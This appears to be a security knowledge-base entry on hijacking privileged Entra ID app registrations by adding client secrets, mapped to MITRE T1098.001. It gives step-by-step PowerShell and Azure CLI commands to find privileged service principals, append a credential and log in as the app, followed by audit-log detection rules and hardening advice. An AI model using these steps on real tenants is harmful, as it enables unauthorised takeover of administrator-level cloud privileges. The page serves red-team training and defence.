# [PE-ACCTMGMT-001]: App Registration Permissions Escalation

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | PE-ACCTMGMT-001 |
| **MITRE ATT&CK v18.1** | [Account Manipulation: Additional Cloud Credentials (T1098.001)](https://attack.mitre.org/techniques/T1098/001/) |
| **Tactic** | Privilege Escalation |
| **Platforms** | Entra ID |
| **Severity** | **Critical** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** In Entra ID, users with the **Application Administrator** or **Cloud Application Administrator** role can manage *all* App Registrations. Crucially, they can add new secrets (client secrets or certificates) to these applications. If an Application has been assigned a high-privilege role (e.g., `Global Administrator`, `Exchange Administrator`, or `RoleManagement.ReadWrite.Directory`), the App Admin can add a secret, authenticate as the Service Principal, and effectively "hijack" those high privileges.
- **Attack Surface:** Entra ID App Registrations.
- **Business Impact:** **Indirect Global Admin**.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** Application Administrator (or Owner of the target App).
- **Tools:**
    - [AADInternals](https://github.com/Gerenios/AADInternals)
    - Azure CLI

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Find Privileged Apps**
Search for apps with `RoleManagement` or Directory Roles.
```powershell
Get-AzureADServicePrincipal | ForEach-Object {
    $role = Get-AzureADServicePrincipalMembership -ObjectId $_.ObjectId
    if ($role) { Write-Host "App: $($_.DisplayName) has roles: $($role.DisplayName)" }
}
```

**Step 2: Add Secret**
Add a new client secret to the target App.
```bash
az ad app credential reset --id <AppClientID> --append
```

**Step 3: Login as App**
```bash
az login --service-principal -u <AppClientID> -p <Secret> --tenant <TenantID>
```
*Now you act as the Global Admin Service Principal.*

## 5. DETECTION (Blue Team Operations)

#### 5.1 Entra ID Logs
| Source | Event | Filter Logic |
|---|---|---|
| **AuditLogs** | `Update application` | Action: "Add service principal credentials". Look for actors who are not the original app owners. |
| **Directory** | `Add member to role` | A Service Principal adding a user to a highly privileged directory role. |

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **Restrict Roles:** Do not assign "Application Administrator" broadly. Use "Application Developer" for specific apps.
*   **Tiering:** Ensure Service Principals with Tier 0 permissions (Global Admin) cannot be managed by Tier 1 admins.

## 7. ATTACK CHAIN
> **Preceding Technique:** [IA-CLOUD-001]
> **Next Logical Step:** [PE-VALID-011]
